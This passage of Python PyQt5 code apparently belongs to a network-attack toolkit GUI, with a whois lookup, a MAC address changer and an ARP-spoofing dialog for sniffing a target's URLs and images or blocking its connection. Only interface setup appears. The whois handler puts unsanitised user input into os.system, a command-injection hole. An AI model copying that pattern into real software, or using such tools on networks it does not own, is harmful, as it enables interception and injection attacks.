                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.insertPlainText(info)
            elif self.lineEdit_site.text().startswith("www."):
                msg1 = QMessageBox()
                msg1.setWindowTitle("Warning")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Information)
                msg1.setText("Whois lookup loading,please wait.")
                msg1.exec_()
                self.url=self.lineEdit_site.text()
                self.ip_adress=socket.gethostbyname(self.url)
                os.system("whois {} > output.txt".format(self.ip_adress))
                with open("output.txt","r+") as file:
                    info=file.read()
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.insertPlainText(info)
            elif check==False:
                msg1 = QMessageBox()
                msg1.setWindowTitle("Warning")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Information)
                msg1.setText("Whois lookup loading,please wait.")
                msg1.exec_()
                self.url="www."+self.lineEdit_site.text()
                self.ip_adress=socket.gethostbyname(self.url)
                os.system("whois {} > output.txt".format(self.ip_adress))
                with open("output.txt","r+") as file:
                    info=file.read()
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.insertPlainText(info)
            else:
                msg1 = QMessageBox()
                msg1.setWindowTitle("Warning")
                msg1.setBaseSize(300,300)
                msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg1.setIcon(QMessageBox.Information)
                msg1.setText("Whois lookup loading,please wait.")
                msg1.exec_()
                os.system("whois {} > output.txt".format(self.lineEdit_site.text()))
                with open("output.txt","r+") as file:
                    info=file.read()
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.insertPlainText(info)     
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def macc_address_change_main(self):
        mydialog=QDialog(self)
        mydialog.setGeometry(600,300,530,500)
        mydialog.setMaximumSize(530,500)
        mydialog.setMinimumSize(530,500)
        mydialog.setWindowTitle("Mac Changer")
        mydialog.setWindowIcon(QtGui.QIcon('images/icon.png'))

        self.label_wallpaper_dialog = QtWidgets.QLabel(mydialog)
        self.label_wallpaper_dialog.setGeometry(QtCore.QRect(0, 0, 530, 500))
        self.label_wallpaper_dialog.setText("")
        self.label_wallpaper_dialog.setPixmap(QtGui.QPixmap("images/mac_changer_530x500.jpg"))
        self.label_wallpaper_dialog.setObjectName("label_wallpaper_dialog")

        self.label_macc = QtWidgets.QLabel(mydialog)
        self.label_macc.setGeometry(QtCore.QRect(120, 40, 300, 100))
        self.label_macc.setObjectName("label_macc")
        self.label_macc.setStyleSheet("color : white;""border-radius:10px;""font:bold 40px;""border-style:outset;""border-width:5px;""border-color:blue;")
        self.label_macc.setText("Mac Changer")

        self.pushButton_macchanger_random = QtWidgets.QPushButton(mydialog)
        self.pushButton_macchanger_random.setGeometry(50,250,145,35)
        self.pushButton_macchanger_random.setObjectName("pushButton_macchanger_random")
        self.pushButton_macchanger_random.setText("Random Mac")
        self.pushButton_macchanger_random.clicked.connect(self.macchanger_random)
        self.pushButton_macchanger_random.setStyleSheet("color : black;")

        self.pushButton_macchanger_original = QtWidgets.QPushButton(mydialog)
        self.pushButton_macchanger_original.setGeometry(220,250,145,35)
        self.pushButton_macchanger_original.setText("Original Mac")
        self.pushButton_macchanger_original.setObjectName("pushButton_macchanger_original")
        self.pushButton_macchanger_original.clicked.connect(self.macchanger_original)
        self.pushButton_macchanger_original.setStyleSheet("color : black;")

        self.pushButton_mac_hand = QtWidgets.QPushButton(mydialog)
        self.pushButton_mac_hand.setGeometry(QtCore.QRect(220, 202, 145, 35))
        self.pushButton_mac_hand.setObjectName("pushButton_mac_hand")
        self.pushButton_mac_hand.setText("Change Mac")
        self.pushButton_mac_hand.clicked.connect(self.hand_mac)
        self.pushButton_mac_hand.setStyleSheet("color : black;")

        self.combobox=QtWidgets.QComboBox(mydialog)
        self.combobox.setObjectName("eth0combo")
        self.combobox.setGeometry(375,223,100,35)
        self.combobox.addItem("Interface")
        self.combobox.addItem("eth0")
        self.combobox.addItem("wlan0")
        self.combobox.setStyleSheet("color : black;")  

        self.lineEdit_mac = QtWidgets.QLineEdit(mydialog)
        self.lineEdit_mac.setGeometry(QtCore.QRect(50, 200, 150, 40))
        self.lineEdit_mac.setObjectName("lineEdit_mac")
        self.lineEdit_mac.setPlaceholderText("00:0B:DB:82:58:C3")
        self.lineEdit_mac.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_macchanger = QtWidgets.QLabel(mydialog)
        self.label_macchanger.setGeometry(QtCore.QRect(950, 290, 100, 31))
        self.label_macchanger.setObjectName("label_macchanger")
        self.label_macchanger.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")
        self.label_macchanger.setText("Mac")
        mydialog.show()
    def arp_spoofing(self):
        mydialog1=QDialog(self)
        mydialog1.setGeometry(500,300,690,450)
        mydialog1.setMaximumSize(690,450)
        mydialog1.setMinimumSize(690,450)
        mydialog1.setWindowTitle("Arp Spoof")
        mydialog1.setWindowIcon(QtGui.QIcon('images/icon.png'))

        self.label_wallpaper_dialog1 = QtWidgets.QLabel(mydialog1)
        self.label_wallpaper_dialog1.setGeometry(QtCore.QRect(0, 0, 690, 450))
        self.label_wallpaper_dialog1.setText("")
        self.label_wallpaper_dialog1.setPixmap(QtGui.QPixmap("images/arpspoof.png"))
        self.label_wallpaper_dialog1.setObjectName("label_wallpaper_dialog1")

        self.label_arp_spoof = QtWidgets.QLabel(mydialog1)
        self.label_arp_spoof.setGeometry(QtCore.QRect(190, 20, 300, 100))
        self.label_arp_spoof.setObjectName("label_arp_spoof")
        self.label_arp_spoof.setStyleSheet("color : white;""border-radius:10px;""font:bold 40px;""border-style:outset;""border-width:7px;""border-color:blue;")
        self.label_arp_spoof.setText("  Arp-Spoof")

        self.label_router_ip_address = QtWidgets.QLabel(mydialog1)
        self.label_router_ip_address.setGeometry(QtCore.QRect(50, 180, 140, 31))
        self.label_router_ip_address.setObjectName("label_router_ip_address")
        self.label_router_ip_address.setText(" Gateway IP Address :")
        self.label_router_ip_address.setStyleSheet("color : white;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_target_ip_address = QtWidgets.QLabel(mydialog1)
        self.label_target_ip_address.setGeometry(QtCore.QRect(50, 250, 140, 31))
        self.label_target_ip_address.setObjectName("label_target_ip_address")
        self.label_target_ip_address.setText(" Target IP Address :")
        self.label_target_ip_address.setStyleSheet("color : white;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.lineEdit_router_ip_address = QtWidgets.QLineEdit(mydialog1)
        self.lineEdit_router_ip_address.setGeometry(QtCore.QRect(210, 180, 131, 33))
        self.lineEdit_router_ip_address.setObjectName("lineEdit_router_ip_address")
        self.lineEdit_router_ip_address.setPlaceholderText(" Gateway IP ")
        self.lineEdit_router_ip_address.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.lineEdit_target_ip_address = QtWidgets.QLineEdit(mydialog1)
        self.lineEdit_target_ip_address.setGeometry(QtCore.QRect(210, 250, 131, 33))
        self.lineEdit_target_ip_address.setObjectName("lineEdit_target_ip_address")
        self.lineEdit_target_ip_address.setPlaceholderText(" Target IP ")
        self.lineEdit_target_ip_address.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.pushButton_sniff_image = QtWidgets.QPushButton(mydialog1)
        self.pushButton_sniff_image.setGeometry(QtCore.QRect(500, 180, 131, 35))
        self.pushButton_sniff_image.setObjectName("pushButton_sniff_image")
        self.pushButton_sniff_image.setText("Sniff Image")
        self.pushButton_sniff_image.clicked.connect(self.sniff_image)
        self.pushButton_sniff_image.setStyleSheet("color : black;")

        self.pushButton_sniff_url = QtWidgets.QPushButton(mydialog1)
        self.pushButton_sniff_url.setGeometry(QtCore.QRect(360, 180, 131, 35))
        self.pushButton_sniff_url.setObjectName("pushButton_sniff_url")
        self.pushButton_sniff_url.setText("Sniff Url")
        self.pushButton_sniff_url.clicked.connect(self.sniff_url)
        self.pushButton_sniff_url.setStyleSheet("color : black;")

        self.pushButton_block_net = QtWidgets.QPushButton(mydialog1)
        self.pushButton_block_net.setGeometry(QtCore.QRect(360, 250, 131, 35))
        self.pushButton_block_net.setObjectName("pushButton_block_net")
        self.pushButton_block_net.setText("Block NET")
        self.pushButton_block_net.clicked.connect(self.block_net)
        self.pushButton_block_net.setStyleSheet("color : black;")

        self.pushButton_free_net = QtWidgets.QPushButton(mydialog1)
        self.pushButton_free_net.setGeometry(QtCore.QRect(500, 250, 131, 35))
        self.pushButton_free_net.setObjectName("pushButton_free_net")
        self.pushButton_free_net.setText("Free NET")
        self.pushButton_free_net.clicked.connect(self.free_net)
        self.pushButton_free_net.setStyleSheet("color : black;")
        mydialog1.show()
########################################---------Functions-----########################################
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    file=open("qss/Diffnes.qss","r")
    with file:
        qss=file.read()
        app.setStyleSheet(qss)
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_()) 












